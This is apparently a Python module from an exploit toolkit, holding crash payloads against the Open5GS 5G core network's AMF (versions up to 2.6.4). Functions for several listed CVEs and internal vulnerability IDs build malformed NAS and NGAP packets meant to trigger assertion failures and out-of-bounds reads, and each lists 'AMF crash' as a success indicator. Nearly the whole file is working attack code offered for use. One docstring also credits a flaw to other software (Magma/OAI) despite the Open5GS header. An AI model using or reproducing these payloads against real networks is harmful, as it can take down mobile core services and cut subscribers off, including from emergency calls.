#!/usr/bin/env python3
"""
Open5GS 5G Exploit Payloads (5 CVEs)
NAS/NGAP Protocol vulnerabilities in Open5GS <= 2.6.4
"""

from .ransacked_core import ExploitPayload, PacketBuilder, ASN1Builder
import struct
import logging

logger = logging.getLogger(__name__)

class Open5GS5GExploits:
    """Open5GS 5G vulnerability exploits"""
    
    def __init__(self):
        self.pb = PacketBuilder()
        self.asn1 = ASN1Builder()
    
    def cve_2024_24428(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24428: Zero-Length NAS Packet Assertion"""
        # Zero-length NAS payload inside NGAP message triggers ogs_assert
        packet = (
            self.pb.build_ngap_header(0x2e, 0x00) +  # Downlink NAS Transport
            self.asn1.encode_ie(0x1a, b'', 0)  # Empty NAS-PDU
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Zero-length NAS 5GMM packet triggers ogs_assert(pkbuf->len)',
            success_indicators=['AMF crash', 'Assertion failure', 'ogs_assert failed']
        )
    
    def cve_2024_24427(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24427 / VULN-A01: Malformed SUCI Assertion"""
        packet = (
            b'\x7e' +  # Security header type: Plain NAS
            b'\x41' +  # Message type: Registration Request
            b'\x01' +  # 5GS registration type
            b'\x01' +  # Mobile Identity Type: SUCI
            b'\xFF\xFF\xFF\xFF'  # Malformed SUCI (invalid structure)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Malformed SUCI triggers ogs_assert(suci) in parsing',
            success_indicators=['AMF crash', 'SUCI parsing failure', 'ogs_assert failed']
        )
    
    def cve_2024_24425(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24425 / VULN-C01: OOB Read in amf_as_establish_req (Magma/OAI)"""
        # NAS packet: data[1] != 0x0 AND data[9] == 0x5c triggers unchecked array access
        packet = b'\x7e\x01' + b'\x00' * 7 + b'\x5c' + b'\x41' * 50
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Specific byte pattern triggers OOB read (data[1] != 0, data[9] == 0x5c)',
            success_indicators=['AMF crash', 'Out-of-bounds read', 'Segmentation fault']
        )
    
    def cve_2024_24426(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24426 / VULN-C02-C20: NGAP Missing IE Assertions (19 variants)"""
        # NG Setup Request missing Global RAN Node ID
        packet = (
            self.pb.build_ngap_header(0x15, 0x00) +  # NG Setup Request
            self.asn1.encode_ie(0x1b, b'\x00\x00\x00\x01', 0)  # Supported TAs (but NO Global RAN Node ID)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='NGAP_FIND_PROTOCOLIE_BY_ID macro asserts when required IE missing',
            success_indicators=['AMF crash', 'Assertion failure', 'Required IE not found'],
            metadata={'variants': 19, 'affected_messages': [
                'NGSetupRequest', 'HandoverRequired', 'HandoverRequest', 'PathSwitchRequest',
                'UplinkRANConfigurationTransfer', 'DownlinkRANConfigurationTransfer'
            ]}
        )
    
    def vuln_a03(self, target_ip: str) -> ExploitPayload:
        """VULN-A03: Malformed SON Configuration Transfer"""
        # Downlink SON Configuration Transfer with malformed data
        packet = (
            self.pb.build_ngap_header(0x28, 0x00) +  # Downlink RAN Configuration Transfer
            self.asn1.encode_ie(0x8f, b'\xFF\xFF\xFF\xFF', 0)  # Malformed SON Config
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Malformed SONConfigurationTransfer triggers ogs_assert(rv == OGS_OK)',
            success_indicators=['AMF crash', 'ASN.1 copy failure', 'Assertion failure']
        )
    
    def vuln_a05(self, target_ip: str) -> ExploitPayload:
        """VULN-A05: Uplink SON Configuration Transfer Assertion"""
        # Uplink SON Configuration Transfer with malformed data
        packet = (
            self.pb.build_ngap_header(0x27, 0x00) +  # Uplink RAN Configuration Transfer
            self.asn1.encode_ie(0x8f, b'\xFF\xFF\xFF\xFF', 0)  # Malformed SON Config
        )
        return ExploitPayload(
            packet=packet,
            protocol='NGAP',
            description='Uplink SON transfer with malformed data triggers assertion',
            success_indicators=['AMF crash', 'send_downlink assertion failure']
        )

__all__ = ['Open5GS5GExploits']
